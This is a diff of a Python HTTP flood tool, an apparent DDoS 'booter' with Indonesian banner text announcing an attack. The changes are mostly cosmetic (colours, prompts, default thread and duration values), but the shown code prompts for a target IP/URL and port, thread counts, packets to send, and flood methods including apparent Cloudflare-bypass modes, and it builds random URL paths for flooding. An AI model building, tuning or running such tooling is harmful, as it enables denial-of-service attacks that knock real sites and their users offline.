@@ -22,8 +22,8 @@ def clear_text():
         os.system('clear')
 
 def status_print(ip,port,thread_id,rps,path_get):
-    print(f"{Fore.YELLOW}[ H A Q ]{Fore.LIGHTYELLOW_EX}Attack {Fore.WHITE}Http {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.RESET}")
-    print(f"{Fore.YELLOW}[ H A Q ]{Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
+    print(f"{Fore.YELLOW} [ H A Q ]{Fore.LIGHTYELLOW_EX} Attack {Fore.WHITE}Http {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.RESET}")
+    print(f"{Fore.GREEN}  [ H A Q ]{Fore.LIGHTBLUE_EX} PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.BLUE}={rps} {Fore.LIGHTCYAN_EX} ID{Fore.RED}={thread_id}{Fore.RESET}")
 def generate_url_path_pyflooder(num):
     msg = str(string.ascii_letters + string.digits + string.punctuation)
     data = "".join(random.sample(msg, int(num)))
@@ -101,18 +101,18 @@ banner = f"""
 {Fore.YELLOW}║{Fore.WHITE}                               By:Kf'24                              {Fore.YELLOW}║
 {Fore.YELLOW}║{Fore.LIGHTYELLOW_EX}                               ——oO0Oo—                      {Fore.YELLOW}║
 {Fore.YELLOW}╚═══════════════════════════════════════════════════════════════╝
-35 DETIK UNTUK MEMULAI SERANGAN...!! #{Fore.RESET}"""
+===>> 35 DETIK UNTUK MEMULAI SERANGAN...!! <==={Fore.RESET}"""
 
 print(banner)
 host = ""
 ip = ""
-target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL>")
-port_loader = int(input(f"{Fore.YELLOW}PORT>"))
-time_loader = time.time() + int(input(f"{Fore.YELLOW}TIME (DEFAULT=250)>"))
-spam_loader = int(input(f"{Fore.BLUE}SPAM THREAD (DEFAULT=50 OR 299)>"))
-create_thread = int(input(F"{Fore.LIGHTGREEN_EX}CREATE THREAD (DEFAULT=50)>"))
-booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=500)>"))
-print(f"{Fore.LIGHTCYAN_EX} EXAMPLE HTTP METHODS> CONNECT GET POST HEAD ")
+target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL==⟩⟩ ")
+port_loader = int(input(f"{Fore.YELLOW}PORT==⟩⟩"))
+time_loader = time.time() + int(input(f"{Fore.GREEN}TIME (DEFAULT=200)==⟩⟩"))
+spam_loader = int(input(f"{Fore.BLUE}SPAM THREAD (DEFAULT=50 OR 250)==⟩⟩"))
+create_thread = int(input(F"{Fore.CYAN}CREATE THREAD (DEFAULT=35)==⟩⟩"))
+booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=500)==⟩⟩"))
+print(f"{Fore.YELLOW} EXAMPLE HTTP METHODS> CONNECT GET POST HEAD ")
 print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> CLOUDFLARE AGE PYFLOODER GATEWAY")
 methods_loader = input(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=GATEWAY)>")
 print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
@@ -132,4 +132,4 @@ for loader_num in range(create_thread):
 clear_text()
 print(banner)
 status_code = True
-print(f"{Fore.GREEN}TRYING SENT . . .{Fore.RESET}")
+print(f"{Fore.GREEN}MULAI MENYERANG . . .{Fore.RESET}")
